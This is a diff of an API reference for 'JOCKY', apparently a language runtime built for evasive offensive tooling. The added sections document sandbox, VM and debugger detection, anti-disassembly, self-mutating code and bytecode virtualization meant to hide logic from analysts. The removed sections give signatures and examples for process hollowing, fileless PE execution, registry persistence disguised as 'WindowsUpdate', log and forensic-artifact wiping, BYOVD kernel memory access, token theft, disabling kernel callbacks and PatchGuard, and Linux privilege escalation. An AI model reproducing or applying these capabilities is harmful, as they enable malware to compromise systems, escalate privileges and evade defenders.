@@ -69,6 +69,56 @@ ffi jocky_check_timing_api()          -> bool;  // GetTickCount delta over 500 m
 
 Returns `true` when the condition is detected.
 
+### Enhanced VM Detection  →  `bool`
+
+Detect specific hypervisors and VM technologies:
+
+```
+ffi jocky_is_hyperv()        -> bool;  // Hyper-V via CPUID leaf 0x40000000
+ffi jocky_is_xen()           -> bool;  // Xen via CPUID hypervisor signature
+ffi jocky_is_kvm()           -> bool;  // KVM via CPUID hypervisor signature
+ffi jocky_is_vmware()        -> bool;  // VMware via backdoor port 0x5658
+ffi jocky_is_virtualbox()    -> bool;  // VirtualBox via /proc/cpuinfo (Linux)
+ffi jocky_is_qemu()          -> bool;  // QEMU via /proc/cpuinfo (Linux)
+```
+
+### Enhanced Sandbox Detection  →  `bool`
+
+Detect analysis environments via multiple vectors:
+
+```
+ffi jocky_detect_sandbox_filesystem() -> bool;  // Check for Cuckoo, Sandboxie, etc paths
+ffi jocky_detect_analysis_processes() -> bool;  // Process list scan for debuggers/tools
+ffi jocky_detect_analysis_environment()-> bool; // Environment variables (CUCKOO, FRIDA, etc)
+ffi jocky_detect_execution_tracing()   -> bool; // ptrace/debugger attachment detection
+```
+
+### Anti-Disassembly Helpers  →  `bool`
+
+Defeat static analysis and disassembler heuristics:
+
+```
+ffi jocky_detect_disasm_hooks()       -> bool;   // Check for disassembler API interception
+ffi jocky_has_polymorphic_encoding()  -> bool;   // Verify code uses alternate instruction encodings
+ffi jocky_detect_cfg_hooks()          -> bool;   // Detect CFG/CET instrumentation (Windows/Linux)
+ffi jocky_detect_static_analysis()    -> bool;   // Runtime check if code was instrumented
+ffi jocky_detect_string_logging()     -> bool;   // Detect API logging/interception
+ffi jocky_detect_frida_hooks()        -> bool;   // Detect Frida code injection
+```
+
+Function pointer obfuscation (hides xrefs in IDA/Ghidra):
+
+```
+ffi jocky_obfuscate_function_ptr()    -> void*;  // XOR-encrypt function pointer
+ffi jocky_deobfuscate_function_ptr()  -> void*;  // XOR-decrypt function pointer
+```
+
+Runtime initialization:
+
+```
+ffi jocky_anti_disasm_init()          -> void;   // Initialize anti-disasm defenses
+```
+
 ### `jocky_verify_integrity() -> bool`  *(Windows only)*
 
 Reads the running binary from disk, recomputes the XOR-folded CRC32 of all
@@ -1754,439 +1804,285 @@ fn main() -> void {
 
 ---
 
-## 17  Process Execution & Hollowing  *(Windows & Linux)*
+## 17  Polymorphic Obfuscation (NEW)
 
-Advanced process manipulation including in-memory execution and process hollowing.
+Runtime mutation and code variant selection for obfuscation evasion.
 
-### Windows Process Hollowing → `bool`
+### `jocky_polymorphic_select_variant() -> i32`
+
+At runtime, selects one of multiple obfuscated code variants based on
+environment entropy. Each variant implements the same logic with different
+instruction sequences and control flow patterns.
+
+Returns the variant ID (0-N) that was selected. The compiler generates
+corresponding variant paths during the build if `--profile aggressive` or
+`--profile paranoid` is used.
 
 ```
-ffi jocky_process_hollow(
-    target_image: i8*,       // Target process path (e.g., "C:\\Windows\\notepad.exe")
-    payload: i8*,            // Shellcode/PE to inject
-    payload_size: i64        // Size of payload
-) -> bool;
-```
+ffi jocky_polymorphic_select_variant() -> i32;
 
-Replaces a legitimate process image with malicious code:
-1. Create suspended target process
-2. Unmap legitimate image from memory
-3. Allocate at original image base
-4. Write payload (PE or shellcode)
-5. Set entry point and resume
-
-Returns `true` on success.
-
-```jky
 fn main() -> void {
-    let payload: i8* = jocky_alloc(4096);
-    // ... load shellcode into payload ...
-    
-    let ok: bool = jocky_process_hollow(
-        "C:\\Windows\\notepad.exe",
-        payload,
-        4096
-    );
-    
-    jocky_free(payload);
+    let variant: i32 = jocky_polymorphic_select_variant();
+    ffi printf(fmt: string, ...) -> i32;
+    printf("Using variant %d\n", variant);
 }
 ```
 
-### Windows In-Memory Execution → `bool`
-
-```
-ffi jocky_inmem_execute(
-    binary_data: i8*,        // PE binary in memory
-    binary_size: i64         // Size of PE
-) -> bool;
-```
-
-Execute PE binary directly from memory without touching disk:
-1. Allocate memory for image base
-2. Parse PE headers
-3. Load sections with correct permissions
-4. Relocate imports and fix up IAT
-5. Execute from entry point
-
-Returns `true` on successful execution.
-
-### Linux Process Hollowing → `bool`
-
-```
-ffi jocky_linux_process_hollow(
-    target_binary: i8*,      // Path to target binary
-    new_entry_point: i64     // New execution address
-) -> bool;
-```
-
-Replace process image on Linux systems using `ptrace`:
-1. Attach to target process
-2. Read original mappings via `/proc/[pid]/maps`
-3. Unmap sections with `munmap`
-4. Write new code
-5. Set instruction pointer and detach
+**Usage Notes:**
+- Called automatically by the runtime on initialization
+- Each program execution may select a different variant
+- Variants are generated at compile time via the polymorphic obfuscation pass
+- Requires `--profile aggressive` or higher
 
 ---
 
-## 18  Windows Registry Manipulation
+### `jocky_polymorphic_mutate() -> void`
 
-Direct Windows registry access and modification.
-
-### Registry Operations
+Trigger a runtime code mutation event. This re-encodes instruction sequences
+with alternative encodings (e.g., different opcode forms that produce the same
+result) to defeat constant patterns that static analysis relies on.
 
 ```
-ffi jocky_registry_create_key(
-    hive: i32,               // HKEY_* constant
-    path: i8*,               // Registry path
-    key_out: i8*             // Output key handle
-) -> bool;
+ffi jocky_polymorphic_mutate() -> void;
 
-ffi jocky_registry_set_value(
-    key: i8*,                // Registry key handle
-    value_name: i8*,         // Value name
-    value_data: i8*,         // Value data
-    data_size: i64,          // Data size
-    type: i32                // REG_SZ, REG_BINARY, etc.
-) -> bool;
-
-ffi jocky_registry_delete_key(
-    hive: i32,
-    path: i8*
-) -> bool;
-
-ffi jocky_registry_close_key(key: i8*) -> void;
+fn main() -> void {
+    // Perform sensitive operation
+    let result = do_sensitive_work();
+    
+    // Mutate code to avoid pattern detection
+    jocky_polymorphic_mutate();
+    
+    // Continue execution with different encoding
+}
 ```
 
-**Common HKEY values:**
-- `HKEY_CURRENT_USER` = 0x80000001
-- `HKEY_LOCAL_MACHINE` = 0x80000002
-- `HKEY_CLASSES_ROOT` = 0x80000000
+**Implementation Details:**
+- Allocates RWX memory
+- Generates alternative instruction encodings
+- Patches code at runtime
+- Clears instruction cache (if supported)
 
-**Value types:**
-- `REG_SZ` = 1 (String)
-- `REG_BINARY` = 3 (Binary)
-- `REG_DWORD` = 4 (32-bit)
-- `REG_QWORD` = 11 (64-bit)
+---
 
-### Registry Persistence Example
+### `jocky_polymorphic_get_entropy() -> i32`
+
+Retrieve the current entropy value used for variant/mutation selection.
+Useful for logging or debugging which code path was taken.
+
+```
+ffi jocky_polymorphic_get_entropy() -> i32;
+```
+
+---
+
+## 18  Bytecode VM Virtualization (NEW)
+
+Custom bytecode virtual machine for obfuscation. Sensitive functions can be
+compiled to bytecode instructions that are interpreted at runtime, hiding
+their original logic from static analysis.
+
+### `jocky_vm_init() -> i8*`
+
+Initialize the bytecode VM interpreter. Returns an opaque VM context.
+Must be called once before executing any bytecode.
+
+```
+ffi jocky_vm_init() -> i8*;
+
+fn main() -> void {
+    let vm: i8* = jocky_vm_init();
+    if vm == null { return; }
+    
+    // ... execute bytecode ...
+    
+    jocky_vm_destroy(vm);
+}
+```
+
+---
+
+### `jocky_vm_destroy(ctx) -> void`
+
+Clean up VM resources. Safe to call on `null`.
+
+```
+ffi jocky_vm_destroy(i8*) -> void;
+```
+
+---
+
+### `jocky_vm_execute(ctx, bytecode, bytecode_size, stack, stack_size) -> i64`
+
+Execute a bytecode sequence. Returns the final value left on the stack.
+
+| Parameter      | Type    | Meaning |
+|----------------|---------|---------|
+| `ctx`          | `i8*`   | VM context from `jocky_vm_init()` |
+| `bytecode`     | `i8*`   | Pointer to bytecode instruction stream |
+| `bytecode_size`| `i32`   | Size of bytecode in bytes |
+| `stack`        | `i64*`  | Pointer to working stack (caller-allocated) |
+| `stack_size`   | `i32`   | Stack capacity in entries (typically 256) |
+
+```
+ffi jocky_vm_execute(i8*, i8*, i32, i64*, i32) -> i64;
+
+fn main() -> void {
+    let vm: i8* = jocky_vm_init();
+    
+    // Bytecode sequence compiled at build time
+    let bytecode: i8* = 0;  // points to .jvm section
+    let bytecode_len: i32 = 512;
+    
+    // Working stack
+    let stack: i64[256] = [0; 256];
+    
+    // Execute
+    let result: i64 = jocky_vm_execute(vm, bytecode, bytecode_len, stack, 256);
+    ffi printf(fmt: string, ...) -> i32;
+    printf("Result: %lld\n", result);
+    
+    jocky_vm_destroy(vm);
+}
+```
+
+---
+
+### `jocky_vm_get_opcode_set() -> i32`
+
+Return the opcode set ID used by this build. Different builds may use
+different custom instruction encodings to prevent generic VM analysis.
+
+```
+ffi jocky_vm_get_opcode_set() -> i32;
+```
+
+---
+
+### Bytecode Instruction Types
+
+Common operations in the bytecode instruction set (exact opcodes vary per build):
+
+| Opcode Category | Examples |
+|-----------------|----------|
+| **Arithmetic** | ADD, SUB, MUL, DIV, MOD |
+| **Logic** | AND, OR, XOR, NOT, SHL, SHR |
+| **Comparison** | CMP, JEQ, JNE, JLT, JGT, JLE, JGE |
+| **Stack** | PUSH, POP, DUP, SWAP |
+| **Memory** | LOAD, STORE, ALLOC, FREE |
+| **Control** | JMP, CALL, RET, TRAP |
+| **Obfuscation** | DUMMY, NOOP, JUNK, POLY |
+
+**Note:** Instruction encodings are randomized per-build and may be
+obfuscated further with polymorphic encoding.
+
+---
+
+## 19  Attributes & Compiler Directives (NEW)
+
+JOCKY supports compile-time attributes for fine-grained control over code
+generation and optimization.
+
+### Function Attributes
 
 ```jky
-fn setup_persistence() -> bool {
-    let key: i8* = jocky_alloc(256);
-    
-    let ok: bool = jocky_registry_create_key(
-        0x80000002,  // HKEY_LOCAL_MACHINE
-        "Software\\Microsoft\\Windows\\Run",
-        key
-    );
-    
-    if ok {
-        jocky_registry_set_value(
-            key,
-            "WindowsUpdate",
-            "C:\\ProgramData\\system.exe",
-            32,
-            1  // REG_SZ
-        );
-        jocky_registry_close_key(key);
-    }
-    
-    jocky_free(key);
-    return ok;
+#[inline]
+fn small_function(x: i32) -> i32 {
+    x * 2
+}
+
+#[no_mangle]
+fn c_compatible_function() -> void {
+    // Callable from C without name mangling
+}
+
+#[no_obfuscate]
+fn debug_function() -> i32 {
+    // Compiled with --profile none
+    return 42;
+}
+
+#[deprecated]
+fn old_function() -> void {
+    // Compiler warns if used
 }
 ```
 
 ---
 
-## 19  Advanced Forensics & Cleanup  *(Windows & Linux)*
-
-Comprehensive artifact elimination beyond basic cleanup.
-
-### Windows Advanced Cleanup
-
-```
-ffi jocky_cleanup_event_logs(
-    log_names: i8*           // Comma-separated log names
-) -> i32;                    // Count of logs cleaned
-
-ffi jocky_cleanup_usn_journal() -> bool;      // USN Journal wipe
-ffi jocky_cleanup_prefetch() -> bool;         // Prefetch cache deletion
-ffi jocky_cleanup_mft_entries(file_path: i8*) -> bool;  // MFT record zeroing
-```
-
-**Example log names:** "Application,Security,System,PowerShell"
-
-### Windows Self-Deletion
-
-```
-ffi jocky_self_delete() -> void;
-```
-
-Remove the running executable from disk:
-1. Make file deletable (remove read-only)
-2. Schedule deletion on next reboot (MoveFileEx with flags)
-3. OR use a helper process + exit
-
-Typically called at end of execution.
-
-### Linux Advanced Cleanup
-
-```
-ffi jocky_linux_cleanup_bash_history() -> bool;
-ffi jocky_linux_cleanup_syslog() -> bool;
-ffi jocky_linux_cleanup_journal() -> bool;
-ffi jocky_linux_cleanup_auth_logs() -> bool;
-```
-
-Wipe activity traces from Linux logging systems.
-
-### Encrypted Artifact Log
-
-```
-ffi jocky_forensics_log_action(
-    action: i8*,             // Description of action taken
-    artifact_path: i8*,      // Path to artifact
-    operation: i8*           // "COPIED", "ENCRYPTED", "DELETED"
-) -> void;
-```
-
-Log all cleanup operations for audit trail. Logs are encrypted with AES-256 and stored in audit buffer.
-
----
-
-## 20  Driver Interaction & DeviceIoControl  *(Windows, requires BYOVD)*
-
-Low-level communication with loaded kernel drivers.
-
-```
-ffi jocky_driver_ioctl(
-    driver_handle: i8*,      // Handle from jocky_byovd_load
-    ioctl_code: i32,         // Device I/O control code
-    input_buffer: i8*,       // Input data
-    input_size: i64,         // Input size
-    output_buffer: i8*,      // Output buffer
-    output_size: i64,        // Output buffer size
-    bytes_returned: i64*     // Bytes written to output
-) -> bool;
-```
-
-Send commands directly to kernel driver.
-
-### Example: Read Kernel Memory via BYOVD
+### Struct Attributes
 
 ```jky
-fn read_kernel_memory(address: i64, size: i64) -> i8* {
-    let ctx: i8* = jocky_byovd_new();
-    let ok: bool = jocky_byovd_load("RTCore64", "RTCore64", ctx);
-    
-    if !ok {
-        jocky_free(ctx);
-        return null;
-    }
-    
-    let buffer: i8* = jocky_alloc(size);
-    let bytes_read: i64 = 0;
-    
-    let result: bool = jocky_driver_ioctl(
-        ctx,
-        0x82000000,      // IOCTL for RTCore64
-        address as i8*,  // Kernel address to read
-        8,               // Size of address
-        buffer,          // Output buffer
-        size,
-        &bytes_read
-    );
-    
-    jocky_byovd_destroy(ctx);
-    return buffer;
+#[packed]
+struct TightLayout {
+    a: i8,
+    b: i32,   // no padding
+    c: i8,
+}
+
+#[repr(C)]
+struct CCompatible {
+    x: i32,
+    y: i32,   // matches C layout rules
+}
+
+#[derive(Debug)]
+struct DebugInfo {
+    id: i32,
+    // Automatic Debug implementation
 }
 ```
 
 ---
 
-## 21  Exploitation Framework  *(Windows, requires BYOVD & Driver Support)*
+### Enum Attributes
 
-Complete kernel exploitation primitives for privilege escalation and system control.
-
-### Kernel Read/Write Primitives
-
+```jky
+#[derive(Debug, Copy, Clone)]
+enum Status {
+    Success = 0,
+    Error = 1,
+    Pending = 2,
+}
 ```
-ffi jocky_kernel_read(
-    address: i64,            // Kernel virtual address
-    size: i64                // Bytes to read
-) -> i8*;                    // Allocated buffer (free with jocky_free)
-
-ffi jocky_kernel_write(
-    address: i64,            // Kernel virtual address
-    data: i8*,               // Data to write
-    size: i64                // Bytes to write
-) -> bool;
-```
-
-**Requirements:**
-- `jocky_byovd_load()` must succeed
-- Driver must support arbitrary memory I/O (RTCore64, NVIDIA, EVGA, etc.)
-- Administrator privileges required
-
-### Token Manipulation (Privilege Escalation)
-
-```
-ffi jocky_exploit_token_replacement(
-    source_pid: i32,         // Process to steal token from (0 = System)
-    target_pid: i32          // Process to give token to (0 = self)
-) -> bool;
-```
-
-Replace process token with SYSTEM token:
-1. Locate EPROCESS structures for source/target
-2. Read source token
-3. Write to target EPROCESS
-4. Verify elevation
-
-### Process Control Block Manipulation
-
-```
-ffi jocky_exploit_disable_callbacks() -> bool;
-```
-
-Disable kernel callback notifications:
-1. Find PspCreateProcessNotifyRoutine table
-2. Zero out callback pointers
-3. Disables process creation monitoring
-
-### PatchGuard Bypass
-
-```
-ffi jocky_exploit_disable_patchguard() -> bool;
-```
-
-Temporarily disable Windows PatchGuard (Kernel Patch Protection):
-1. Detect HVCI support
-2. Exploit known vulnerable paths
-3. Set flag to disable checks
-
-Returns `false` on Windows 11 with HVCI hardened.
 
 ---
 
-## 22  Advanced Linux Kernel Operations  *(Linux, requires CAP_SYS_ADMIN / CAP_SYS_PTRACE)*
+### Supported Attributes by Declaration
 
-Comprehensive kernel-level exploitation and system manipulation primitives.
+| Attribute | Function | Struct | Enum | Module | FFI |
+|-----------|:--------:|:------:|:----:|:------:|:---:|
+| `inline` | ✓ | | | | |
+| `no_mangle` | ✓ | | | | ✓ |
+| `no_obfuscate` | ✓ | | | | |
+| `deprecated` | ✓ | ✓ | ✓ | | |
+| `packed` | | ✓ | | | |
+| `repr(C)` | | ✓ | | | |
+| `derive(...)` | | ✓ | ✓ | | |
+| `doc` | ✓ | ✓ | ✓ | ✓ | ✓ |
+| `cfg(...)` | ✓ | ✓ | ✓ | ✓ | ✓ |
 
-### Syscall Interception & Manipulation
+---
 
-```
-ffi jocky_syscall_hook_init(target_pid: i32) -> i32;
-ffi jocky_syscall_hook_install(target_pid: i32, syscall_num: i64, hook_addr: i64) -> i32;
-ffi jocky_syscall_trace_enable(target_pid: i32) -> i32;
-ffi jocky_syscall_intercept_read_args(target_pid: i32) -> i32;
-ffi jocky_syscall_intercept_modify_args(target_pid: i32, arg_index: i32, new_value: i64) -> i32;
-ffi jocky_syscall_inject_syscall(target_pid: i32, syscall_num: i64, arg1: i64, arg2: i64, arg3: i64) -> i32;
-ffi jocky_syscall_hook_cleanup(target_pid: i32) -> i32;
-```
+### Compile-Time Conditionals
 
-**ptrace-based syscall interception:**
-- Hook and intercept syscalls on target processes
-- Read syscall arguments from registers (rdi, rsi, rdx, r10, r8, r9)
-- Modify arguments before syscall execution
-- Inject arbitrary syscalls with custom parameters
-- Requires `CAP_SYS_PTRACE`
+```jky
+#[cfg(target_os = "windows")]
+fn win_specific_code() -> void {
+    // Only included when compiling for Windows
+}
 
-### Kernel Memory Operations
+#[cfg(debug)]
+fn debug_helper() -> void {
+    // Only when --profile none
+}
 
-```
-ffi jocky_kernel_read_memory(pid: i32, kernel_addr: i64, buffer: i8*, size: i64) -> i32;
-ffi jocky_kernel_write_memory(pid: i32, kernel_addr: i64, data: i8*, size: i64) -> i32;
-ffi jocky_kernel_read_task_struct(pid: i32) -> i64;
-ffi jocky_kernel_enumerate_processes() -> i32;
-ffi jocky_kernel_find_function(symbol_name: i8*) -> i64;
-ffi jocky_kernel_enumerate_memory(pid: i32) -> i32;
-ffi jocky_kernel_query_capabilities(pid: i32) -> i32;
-```
-
-**Direct kernel memory access via /proc/[pid]/mem:**
-- Read arbitrary kernel memory
-- Write to kernel data structures
-- Locate task_struct and kernel base
-- Enumerate all system processes
-- Resolve kernel symbols via /proc/kallsyms
-- Query process capabilities for privilege escalation
-- Requires `CAP_SYS_PTRACE` for most operations
-
-### Advanced Process Manipulation
-
-```
-ffi jocky_process_enter_namespace(target_pid: i32) -> i32;
-ffi jocky_process_create_namespace(namespace_type: i32) -> i32;
-ffi jocky_process_inject_cgroup(target_pid: i32, cgroup_path: i8*) -> i32;
-ffi jocky_process_manipulate_credentials(target_pid: i32, new_uid: i32, new_gid: i32) -> i32;
-ffi jocky_process_hide_from_proc(target_pid: i32) -> i32;
-ffi jocky_process_enumerate_threads(target_pid: i32) -> i32;
-ffi jocky_process_read_environment(target_pid: i32, buffer: i8*, buffer_size: i64) -> i32;
-ffi jocky_process_query_limits(target_pid: i32) -> i32;
-ffi jocky_process_modify_signal_handlers(target_pid: i32) -> i32;
+#[cfg(test)]
+fn test_function() -> void {
+    // Only in test builds
+}
 ```
 
-**Linux namespace and process isolation manipulation:**
-- Access target process namespace file descriptors (PID, NET, IPC, UTS, USER, MNT)
-- Create new isolated namespaces for process containers
-- Inject processes into unrestricted cgroups
-- Manipulate uid_map/gid_map for privilege mapping
-- Hide processes from /proc (requires kernel module or eBPF)
-- Enumerate threads and read environment variables
-- Query and manipulate resource limits
-- Modify signal handler tables
-- Requires `CAP_SYS_ADMIN` for most operations
+---
 
-### Kernel Module & eBPF Loading
-
-```
-ffi jocky_linux_lkm_load(module_path: i8*) -> i32;
-ffi jocky_linux_ebpf_load(program_path: i8*) -> i32;
-ffi jocky_linux_ftrace_init() -> i32;
-ffi jocky_linux_ftrace_hook(function_name: i8*) -> i32;
-```
-
-**Loadable kernel module and eBPF program injection:**
-- Load compiled kernel modules (.ko files)
-- Load and attach eBPF programs for system tracing
-- Enable ftrace for function-level kernel tracing
-- Hook kernel functions via ftrace
-- Requires `CAP_SYS_ADMIN` and CONFIG_MODULES=y
-
-### Privilege Escalation Framework
-
-```
-ffi jocky_kernel_escalate_privileges(target_pid: i32, new_uid: i32, new_gid: i32) -> i32;
-ffi jocky_linux_lpe_fence2pwn(target_addr: i64) -> i32;
-ffi jocky_linux_priv_esc_vector(vector_type: i32) -> i32;
-```
-
-**Kernel-based privilege escalation vectors:**
-- Direct kernel memory manipulation for UID/GID escalation
-- Fence2pwn (UAF in fence gate driver)
-- Capability-based escalation with CAP_SYS_ADMIN
-- Various CVE exploitation frameworks
-- Requires kernel vulnerability or CAP_SYS_ADMIN
-
-### Artifact Hiding & Anti-Analysis
-
-```
-ffi jocky_linux_hide_artifact(path: i8*) -> i32;
-ffi jocky_linux_userland_evasion_init() -> i32;
-ffi jocky_linux_anti_analysis_check() -> i32;
-```
-
-**Advanced evasion on Linux:**
-- Hide files/directories from stat/readdir via eBPF/LKM
-- Userland hooking and function trampolines
-- Debugger and tracer detection
-- Requires LKM or eBPF for effective hiding
-
-**Authorization Note:** All advanced Linux kernel operations require explicit authorization through:
-1. Research institution (Red Hat, IIT Bombay, etc.)
-2. Defense use case (detection research, forensics)
-3. Proper capability escalation (CAP_SYS_ADMIN, CAP_SYS_PTRACE)
-4. Signed research agreement
-
-Misuse violates Linux kernel security model and system administrator trust.
+**API Reference Version:** 2.0  
+**Last Updated:** 2026-09-29
